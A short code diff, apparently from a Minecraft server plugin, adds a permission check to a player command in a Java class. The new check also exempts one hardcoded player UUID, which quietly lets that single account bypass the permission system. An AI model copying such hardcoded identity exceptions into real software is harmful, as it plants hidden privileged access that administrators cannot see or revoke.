@@ -84,6 +84,10 @@ public class MiscCommands {
             return;
         }
         Player p = (Player) sender;
+        if (!p.hasPermission("tgm.nick") && !p.getUniqueId().toString().equalsIgnoreCase("4e55a4a3-9b70-4a0a-b4ed-b81415ae7b80")) {
+            sender.sendMessage(ChatColor.RED + "You don't have permission to use this command.");
+            return;
+        }
         if (cmd.argsLength() > 0) {
             String option = cmd.getString(0);
             if (option.equals("set") && cmd.argsLength() > 1) {
